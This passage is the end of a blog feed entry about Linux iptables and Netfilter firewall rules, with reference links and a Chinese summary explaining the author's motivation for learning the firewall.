REJECT</span><br></pre></td></tr></table></figure><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://en.wikipedia.org/wiki/Netfilter" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Netfilter</a></p><p><a href="https://en.wikipedia.org/wiki/Iptables" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Iptables</a></p><p><a href="https://www.jianshu.com/p/fbadb784bc16" target="_blank" rel="noopener">https://www.jianshu.com/p/fbadb784bc16</a></p><p><a href="https://www.digitalocean.com/community/tutorials/a-deep-dive-into-iptables-and-netfilter-architecture" target="_blank" rel="noopener">https://www.digitalocean.com/community/tutorials/a-deep-dive-into-iptables-and-netfilter-architecture</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;写这篇小计的原因呢，主要是在学校做项目或者自己在Linux服务器搭点什么服务的时候，总是因为各种原因Unreachable，并且找了半天原因最终发现是Linux的防火墙策略导致。之前都是稀里糊涂的为了服务赶紧上线，登录某某云控制台或者复制网上的代码修改服务器的防火墙策略，但
      
    
    </summary>
    
    
      <category term="Linux" scheme="http://lxzmads.github.io/tags/Linux/"/>
    
      <category term="iptables" scheme="http://lxzmads.github.io/tags/iptables/"/>
    
  </entry>
  
</feed>
